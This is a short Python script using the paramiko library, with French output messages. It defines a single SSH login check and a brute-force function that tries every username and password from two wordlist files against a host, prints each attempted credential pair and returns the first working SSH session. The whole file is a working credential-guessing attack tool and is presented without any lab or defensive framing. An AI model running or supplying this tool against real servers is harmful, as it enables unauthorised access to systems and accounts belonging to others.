import paramiko

def connect_host(hostname, username, password):
    ssh_client = paramiko.SSHClient()
    ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        ssh_client.connect(hostname, username=username, password=password)
        print("Connexion réussie")

        ssh_client.close()
        return True
    except paramiko.AuthenticationException:
        print("Échec de l'authentification")
        return False
    except Exception as e:
        print(f"Erreur lors de la connexion : {e}")
        return False

def bruteforce(host, username_file, password_file):
  
    with open(username_file, 'r') as f:
        usernames = f.read().splitlines()

 
    with open(password_file, 'r') as f:
        passwords = f.read().splitlines()

   
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    for username in usernames:
        for password in passwords:
            try:
               
                ssh.connect(hostname=host, username=username, password=password)
                print("Connexion réussie avec {} / {}".format(username, password))
                return ssh 
            except paramiko.AuthenticationException:
                print("Échec de connexion avec {} / {}".format(username, password))
            except Exception as e:
                print("Erreur lors de la tentative de connexion:", str(e))
    
    print("Toutes les tentatives de connexion ont échoué.")
    return None 